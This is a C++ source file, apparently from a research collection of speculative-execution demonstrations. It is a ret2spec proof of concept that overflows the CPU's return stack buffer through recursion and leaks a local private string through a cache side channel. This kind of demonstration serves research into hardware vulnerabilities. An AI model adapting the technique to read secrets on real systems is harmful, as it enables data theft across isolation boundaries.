/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Causes misprediction of function returns that leads to speculative execution
// of otherwise dead code. Leaks architecturally inaccessible data from the
// process's address space.
//
// PLATFORM NOTES:
// This program should leak data on pretty much any system where it compiles.
// We only require an out-of-order CPU that predicts function returns.

/**
 * Demonstration of ret2spec that exploits the fact that return stack buffers
 * have limited size and they can be rewritten by recursive invocations of
 * another function.
 * We have two functions that we named after their constant return values. First
 * the ReturnsTrue function invokes itself kRecursionDepth times and in the
 * deepest invocation it calls ReturnsFalse function. Returns_false function
 * invokes itself kRecursionDepth times. All returns of the ReturnsFalse
 * function are predicted correctly, but returns of ReturnsTrue function are
 * mispredicted to the return address of the ReturnsFalse function, because all
 * RSB pointers were rewritten by ReturnsFalse invocations. We steer those
 * mispredictions to an unreachable code path with microarchitectural side
 * effects.
 **/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "ret2spec_common.h"
#include "utils.h"

// Does nothing.
static void NopFunction() {}

// Starts the recursive execution of ReturnsFalse.
static void ReturnsFalseRecursion() {
  ReturnsFalse(kRecursionDepth);
}

int main() {
  return_true_base_case = NopFunction;
  return_false_base_case = ReturnsFalseRecursion;
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i;
    std::cout << Ret2specLeakByte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
